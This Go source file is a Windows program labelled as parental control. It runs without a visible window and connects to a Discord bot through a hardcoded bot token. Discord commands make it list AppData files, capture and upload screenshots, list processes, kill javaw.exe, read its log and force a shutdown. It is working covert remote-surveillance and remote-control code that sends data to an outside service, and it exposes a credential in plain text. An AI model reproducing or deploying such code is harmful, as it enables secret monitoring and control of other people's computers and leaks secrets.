package main

import (
	"bytes"
	"fmt"
	"image"
	"image/png"
	"io"
	"os"
	"os/exec"
	"time"

	"fyne.io/fyne/v2"

	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"

	"github.com/bwmarrin/discordgo"
	log "github.com/charmbracelet/log"
	"github.com/kbinani/screenshot"

	"github.com/mitchellh/go-ps"

	"github.com/nfnt/resize"
)

const (
	Intents = discordgo.IntentsDirectMessages |
		discordgo.IntentsGuildBans |
		discordgo.IntentsGuildEmojis |
		discordgo.IntentsGuildIntegrations |
		discordgo.IntentsGuildInvites |
		discordgo.IntentsGuildMembers |
		discordgo.IntentsGuildMessageReactions |
		discordgo.IntentsGuildMessages |
		discordgo.IntentsGuildVoiceStates |
		discordgo.IntentsGuilds |
		discordgo.IntentsGuildVoiceStates
)

var a = app.New()
var w  fyne.Window
var warned = false
var datafolder = "D:/Apps/parentalcontrol/"

func main() {

	// save logs into a file
	os.Remove("archify.log")
	f, err := os.OpenFile(datafolder + "archify.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Warn("error opening file: %v", err)
	}
	defer f.Close()

	log.SetOutput(io.MultiWriter(f, os.Stdout))

	go func() {
		dg, err := discordgo.New("Bot MTE5NzI1Mjc2Mjk2MzAzNDExMg.GaZbAF.Tlp_2c2_WqwzyMhtGEofIvUIOZ5A4Pm4OyGBmk")
		if err != nil {
			log.Error(err)
		}
		dg.Identify.Intents = discordgo.MakeIntent(Intents)

		dg.AddHandler(messageCreate)
		dg.AddHandler(ready)

		for {
			err = dg.Open()
			if err != nil {
				log.Error("Error opening connection to Discord", err)
				dg.Close()
				time.Sleep(5 * time.Second)
			} else {
				log.Info("Discord bot is now running")
				break
			}
		}

	}()

	for {
		if ifMineIsRunning() {
			if !warned {
				warned = true
				// log.Warn("mine running, showing warning")

				w = a.NewWindow("Images")
				f, _ := os.Open(datafolder + "warning.png")
				uncodedimage, _, err := image.Decode(f)
				if err != nil {
					log.Error(err)
				}
				img := canvas.NewImageFromImage(uncodedimage)
				w.SetContent(img)
				w.Resize(fyne.NewSize(1280, 720))
				w.CenterOnScreen()
				w.SetPadded(false)
				// w.SetFullScreen(true)
				w.RequestFocus()
				w.ShowAndRun()
				w.Close()
			} else {
				// log.Warn("mine running, warning already shown")
				time.Sleep(5 * time.Minute)
			}
		} else {
			warned = false
			// log.Warn("mine not running")
			// log.Warn("sleeping....")
			time.Sleep(1 * time.Minute)
		}

	}

}

func ready(s *discordgo.Session, event *discordgo.Ready) {
	channel, _ := s.UserChannelCreate("782162374890487810")
	s.ChannelMessageSend(
		"782162374890487810",
		"Something went wrong while sending the DM!",
	)
	_, _ = s.ChannelMessageSend(channel.ID, "PC ON! \n Commands: \n /files \n /screenshot \n /exes \n /kill \n /shutdown \n /log \n /warnoff \n")

	s.UpdateListeningStatus("/Running")

	for {
		if ifMineIsRunning() {
			_, _ = s.ChannelMessageSend(channel.ID, "javaw.exe is running!")
			time.Sleep(30 * time.Minute)

		} else {
			time.Sleep(1 * time.Minute)
		}
	}
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == "/files" {
		s.ChannelMessageSend(m.ChannelID, readFiles())
	}

	if m.Content == "/screenshot" {
		imgData, err := os.ReadFile(getScreenshot())
		if err != nil {
			log.Error("Error reading image file", err)
			return
		}

		file := &discordgo.File{
			Name:   "image.png",
			Reader: bytes.NewReader(imgData),
		}

		_, err = s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Files: []*discordgo.File{
				file,
			},
		})
		if err != nil {
			log.Error("Error sending image", err)
		}
	}

	if m.Content == "/exes" {
		exes := exes()
		for i := 0; i < len(exes); i += 2000 {
			end := i + 2000
			if end > len(exes) {
				end = len(exes)
			}
			_, err := s.ChannelMessageSend(m.ChannelID, exes[i:end])
			if err != nil {
				log.Error(err)
			}
		}
	}

	if m.Content == "/kill" {
		s.ChannelMessageSend(m.ChannelID, killjavaw())

	}

	if m.Content == "/shutdown" {
		s.ChannelMessageSend(m.ChannelID, "shutting down")

		cmd := exec.Command("shutdown", "/s", "/hybrid", "/f", "/t", "0")
		err := cmd.Run()
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "error shutting down")

		}
	}

	if m.Content == "/log" {
		
		file, err := os.ReadFile(datafolder + "archify.log")
		if(err != nil){
			s.ChannelMessageSend(m.ChannelID, "error reading log")
		}else{
			s.ChannelMessageSend(m.ChannelID, string(file))
		}


	}

	if m.Content == "/warnoff" {
		w.Close()
	}

}

func readFiles() string {
	files, err := os.ReadDir("C:/Users/Home/AppData/Roaming/")
	if err != nil {
		log.Error("Error reading directory", err)
		return "EMPTY"
	}

	filesData := "-------------------- \n"

	for _, file := range files {
		filesData = filesData + file.Name() + "\n"
	}

	return filesData
}

func getScreenshot() string {
	bounds := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		panic(err)
	}

	resizedImg := resize.Resize(1024, 576, img, resize.Lanczos3)
	// time := time.Now().Format("2006-01-02-15:04:05")
	fileName := fmt.Sprintf(datafolder+ "screenshot"  +".png", )
	file, _ := os.Create(fileName)
	defer file.Close()
	png.Encode(file, resizedImg)

	return fileName
}

func exes() string {
	processList, err := ps.Processes()
	if err != nil {
		log.Error("Error reading process list", err)
		return err.Error()
	}

	var processes string

	for x := range processList {
		var process ps.Process
		process = processList[x]

		processes = processes + process.Executable() + "\n"

	}
	return processes

}

func ifMineIsRunning() bool {
	processList, err := ps.Processes()
	if err != nil {
		log.Error("Error reading process list", err)
		return false
	}

	for x := range processList {
		var process ps.Process
		process = processList[x]

		if process.Executable() == "javaw.exe" {
			return true
		}

	}

	return false
}

func killjavaw() string {
	err := exec.Command("taskkill", "/im", "javaw.exe", "/f").Run()
	if err != nil {
		return "Error killing javaw.exe"
	} else {
		return "done"
	}
}

/*

Build Command:
env CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=/usr/bin/x86_64-w64-mingw32-gcc go build  -ldflags="-H windowsgui"

*/
